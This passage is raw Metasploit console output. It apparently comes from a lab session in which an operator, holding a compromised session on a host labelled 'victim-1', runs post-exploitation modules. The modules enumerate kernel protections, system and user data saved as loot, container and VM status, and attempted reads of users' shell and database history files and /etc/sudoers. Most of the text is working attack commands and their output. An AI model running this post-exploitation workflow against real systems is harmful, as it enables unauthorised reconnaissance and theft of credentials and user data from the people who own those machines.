   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_protections) > set session 3
session => 3
msf5 post(linux/gather/enum_protections) > run

[*] Running module against 192.203.126.3 [victim-1]
[*] Info:
[*]     Debian GNU/Linux 8  
[*]     Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 GNU/Linux
[*] Finding system protections...
[+] ASLR is enabled
[+] SMEP is enabled
[+] SMAP is enabled
[+] Yama is installed and enabled
[*] Finding installed applications...
[+] iptables found: /sbin/iptables
[+] tcpdump found: /usr/sbin/tcpdump
[+] wireshark found: /usr/bin/wireshark
[*] System protections saved to notes.
[*] Post module execution completed
msf5 post(linux/gather/enum_protections) > notes

Notes
=====

 Time                     Host           Service  Port  Protocol  Type                         Data
 ----                     ----           -------  ----  --------  ----                         ----
 2023-08-08 11:22:04 UTC  192.203.126.3                           host.os.session_fingerprint  {:name=>"192.203.126.3", :os=>"Debian 8.11 (Linux 5.4.0-153-generic)", :arch=>"x64"}
 2023-08-08 11:46:30 UTC  192.203.126.3                           linux.protection             "ASLR is enabled"
 2023-08-08 11:46:30 UTC  192.203.126.3                           linux.protection             "SMEP is enabled"
 2023-08-08 11:46:30 UTC  192.203.126.3                           linux.protection             "SMAP is enabled"
 2023-08-08 11:46:31 UTC  192.203.126.3                           linux.protection             "Yama is installed and enabled"
 2023-08-08 11:46:31 UTC  192.203.126.3                           linux.protection             "/sbin/iptables"
 2023-08-08 11:46:34 UTC  192.203.126.3                           linux.protection             "/usr/sbin/tcpdump"
 2023-08-08 11:46:35 UTC  192.203.126.3                           linux.protection             "/usr/bin/wireshark"
```

```
msf5 post(linux/gather/enum_protections) > search enum_system

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   1  post/linux/gather/enum_system                   normal  No     Linux Gather System and User Information


msf5 post(linux/gather/enum_protections) > use post/linux/gather/enum_system
msf5 post(linux/gather/enum_system) > options

Module options (post/linux/gather/enum_system):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_system) > set session 3
session => 3
msf5 post(linux/gather/enum_system) > run

[+] Info:
[+]     Debian GNU/Linux 8  
[+]     Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 GNU/Linux
[+]     Module running as "root" user
[*] Linux version stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_268274.txt
[*] User accounts stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_629124.txt
[*] Installed Packages stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_232588.txt
[*] Running Services stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_188927.txt
[*] Cron jobs stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_163364.txt
[*] Disk info stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_764268.txt
[*] Logfiles stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_483722.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20230808114743_Linux_PE_192.203.126.3_linux.enum.syste_042711.txt
[*] Post module execution completed
```

```
msf5 post(linux/gather/enum_system) > search checkcontainer

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   1  post/linux/gather/checkcontainer                   normal  No     Linux Gather Container Detection


msf5 post(linux/gather/enum_system) > use post/linux/gather/checkcontainer
msf5 post(linux/gather/checkcontainer) > options

Module options (post/linux/gather/checkcontainer):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/checkcontainer) > set session 3
session => 3
msf5 post(linux/gather/checkcontainer) > run

[+] This appears to be a 'Docker' container
[*] Post module execution completed
```

```
msf5 post(linux/gather/checkcontainer) > search checkvm

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   1  post/linux/gather/checkvm                     normal  No     Linux Gather Virtual Environment Detection
   2  post/solaris/gather/checkvm                   normal  No     Solaris Gather Virtual Environment Detection
   3  post/windows/gather/checkvm                   normal  No     Windows Gather Virtual Environment Detection


msf5 post(linux/gather/checkcontainer) > use post/linux/gather/checkvm
msf5 post(linux/gather/checkvm) > options

Module options (post/linux/gather/checkvm):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/checkvm) > set session 3
session => 3
msf5 post(linux/gather/checkvm) > run

[*] Gathering System info ....
[-] Failed to open file: /proc/scsi/scsi: core_channel_open: Operation failed: 1
[-] Post failed: NoMethodError undefined method `gsub' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/linux/gather/checkvm.rb:74:in `run'
[*] Post module execution completed
```

```
msf5 post(linux/gather/checkvm) > search enum_users_history

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   1  post/linux/gather/enum_users_history                   normal  No     Linux Gather User History


msf5 post(linux/gather/checkvm) > use post/linux/gather/enum_users_history
msf5 post(linux/gather/enum_users_history) > options

Module options (post/linux/gather/enum_users_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_users_history) > set session 3
session => 3
msf5 post(linux/gather/enum_users_history) > run

[+] Info:
[+]     Debian GNU/Linux 8  
[+]     Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 GNU/Linux
[-] Failed to open file: /root/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /dev/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/games/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/cache/man/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/lpd/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/mail/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/news/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/spool/uucp/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/www/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/backups/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/list/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/ircd/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/gnats/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /nonexistent/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/netif/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/resolve/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /run/systemd/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/run/dbus/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/colord/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/saned/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /var/lib/usbmux/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/sudoers: core_channel_open: Operation failed: 1
[+] Last logs stored in /root/.msf4/loot/20230808115212_Linux_PE_192.203.126.3_linux.enum.users_011720.txt
[*] Post module execution completed
msf5 post(linux/gather/enum_users_history) > 
```

